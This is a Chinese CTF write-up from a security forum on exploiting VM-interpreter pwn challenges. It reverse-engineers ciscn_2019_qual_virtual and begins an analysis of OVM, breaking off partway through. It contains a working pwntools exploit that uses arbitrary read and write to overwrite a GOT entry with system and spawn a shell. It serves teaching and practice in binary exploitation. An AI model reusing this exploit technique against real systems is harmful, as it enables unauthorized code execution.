---
title: 一些vmpwn的详细总结
url: https://forum.butian.net/share/3968
source: 奇安信攻防社区
date: 2024-12-31
fetch_date: 2025-10-06T19:37:22.548498
---

# 一些vmpwn的详细总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一些vmpwn的详细总结

* [CTF](https://forum.butian.net/topic/52)

总结一些常见vmpwn题的打法，数据越界泄露libc，通过偏移数据处理来得到危险函数地址等常见漏洞，会结合两道例题来进行讲解

前言
==
ctf比赛中的vm逆向不是指VMware或VirtualBox一类的虚拟机，而是一种解释执行系统或者模拟器，近几年出现的频率越来越高了，故总结一下vmpwn中常见的漏洞
ciscn\\_2019\\_qual\\_virtual
==========================
程序保护
----
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-03aae925c9ba35083040892b59ee0b7ddd74bd90.png)
发现没开pie和只开了Partial RELRO
程序分析
----
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-5eeaed9eb1fd8d1bc55aea520621ee215c123cf5.png)
程序开始先是定义了三个堆分别作为vm的stack text data段
### init\\_seg
逆向出结构体后是这样
```php
struct segment\_chunk
{
char \*segment;
unsigned int size;
int nop; 这个nop后面分析发现 是stack段中的值的个数
};
```
### 读入数据并且转移数据
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-ab4e40cd19ae92ca77b2237af7bac87f135dbec8.png)
#### 第一个红框
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-8ea7410e09b9348a5ad1245d834ac249945339b3.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-dabe45734966cae3b643f093b6b3430b48f48c60.png)
先将值存入ptr所在的堆块 然后在进入move\\_func 以' '空格为区分切割存入最开始设置的text段
#### 第二个红框
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2acf8c36c09749cff5320884d02caceb6827506f.png)
代码逻辑基本相同，是存放入stack段中
### vm\\_func
这里逆出来功能点是下图这样
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-0eae5103b6f3d2659392530589d51304390eec9b.png)
有两个关键的函数
#### take\\_value
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b8f4d33e8ee7f0691a161f22124559a4a7e8343e.png)
可以看出是把a1-&gt;segment中的指取出来给a2
#### set\\_value
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-05d131376378c76c7957fa96a395297b0ee806f8.png)
与take\\_value相反
#### 功能点
```php
func\_pop(v3\_data, a2\_stack);
func\_push(v3\_data, a2\_stack);
func\_add(v3\_data);
func\_sub(v3\_data);
func\_x(v3\_data); 乘法
func\_division(v3\_data); 除法
func\_load(v3\_data);
func\_save(v3\_data);
```
这里分析一下load和save 其他的可以参考分析得出
#### func\\_load(v3\\_data);
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-f2ba3163e3a11dc301b1382121012a8ae720caa6.png)
这里是取出data段中的值为v2，然后把data\[0\]的值设置为data\[v2\]地址所存放的值
#### func\\_save(v3\\_data);
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-a3841bfcccec43e6603f26aae20a6ea3860e108f.png)
取两个参数，一个v2，一个v3 并且把data\[v2\]的值存放为v3
漏洞分析
----
这里关键点在于load和save这两个功能
load可以进行任意地址读，相当于可以读入data\[num\]的任何数据为data\[0\]
save可以进行任意地址写，由于v2和v3都是可控的，因此可以进行任意地址写
### 攻击思路
由于got表是可以写的，并且我们有任意地址写 因此我们可以通过之前的分析发现，data段的上方就是存放data段的指针
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-18107cfaafc07fe4edc69ae0abf1917cee68ccdf.png)
因此我们可以通过save来把指针覆盖为got段的下方一点的位置，然后通过load去取出puts的地址 然后通过add或者sub的功能去增加偏移把puts去修改为system，由于最后有一个puts(s) 是我们可控的 因此就可以getshell
exp如下
-----
```php
#!/usr/bin/python3
from pwn import \*
import random
import os
import sys
import time
from pwn import \*
from ctypes import \*
#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log\_level='debug')
#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log\_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
def dbg():
gdb.attach(mx)
#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3\_amd64/libc.so.6')
filename = "./ciscn\_2019\_qual\_virtual"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\
dbg()
rl("Your program name:\n")
sl(b'/bin/sh\x00')
rl("Your instruction:\n")
payload=b'push push save push load push add push save'
sl(payload)
rl("Your stack data:\n")
content=b'4210896 -3 -21 -193680 -21'
sl(content)
inter()
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-5759a553e1d34f21666c7ca742bc73373c3e0a67.png)
OVM
===
程序保护
----
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-e50923fe9284f7fef8d854049502eeaeda360158.png)
程序分析
----
### main
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-668634f500f7f62e1ab401a803f3b7ca4ae2f43d.png)
这一部分重点就是给SP PC赋值，然后把code读入memory\[PC+i\]的位置，并且通过检测限制单个字节最大为0xff
### fetch
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-79465d02bb0201b190bc7d1c735d91352cbc10f9.png)
这里就是取出PC的值 传给memory 方便后面执行execute程序
### execute
```php
v4 = (a1 & 0xF0000u) >> 16;
v3 = (unsigned \_\_int16)(a1 & 0xF00) >> 8;
v2 = a1 & 0xF;
result = HIBYTE(a1);
```
这里对传入的a1分别进行了几段的处理 处理后分别为v4 v3 v2 HIBYTE(a1);
#### add功能： 0x70
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-89f1dc9081bc2edb846b1228e51ea0d97f17e89b.png)
#### 异或功能：0xb0
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-1548b3abe64fe1c7e1f6ed7c889c88c33c801f48.png)
#### 右移操作：0xd0
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7c377cc611cbbc5dfec9a1b37a462303a0d5dd2d.png)
#### 打印寄存器情况：0xff
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-70f41c684f4112922c62ecc494a5d5d1ebedf1ae.png)
#### 左移操作：0xc0
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b5370da38bfbbf323a1024dc5aa3ab27e0f29235.png)
#### 位与操作：0x90
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-3e9bf683abf44efc0f2876473e5c6c6182079781.png)
#### 位或操作：0xa0
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-76bf2fd88924c78262b18905b8b805990eb755d0.png)
#### 减法操作：0x80
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-09f58100c680ba675f7d95a9e9703e8b499df42c.png)
#### save操作： 0x30
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7124687c3c7a5451a54f64ea81e2df800cdc8139.png)
#### push操作:0x50
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-bcba42a92e56daec84f2a76ecc02ed8b5a9a38f0.png)
#### pop操作: 0x60
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-25141d66c3f5b86f741858079a58e475b685f983.png)
#### memory内存写入:0x40
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-1366019594c6851eaf494c1a8c20767c6a9a6695.png)
给reg\[v4\]赋值 0x10 0x20
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-d8daf275e45b8e680a313adc3c61998ae54fb660.png)
### 功能表一览
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-55a7e4106f261658d75137a0ba212df93c20002b.png)
漏洞分析
----
我们关注到
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-780f17a80d7d43b2db...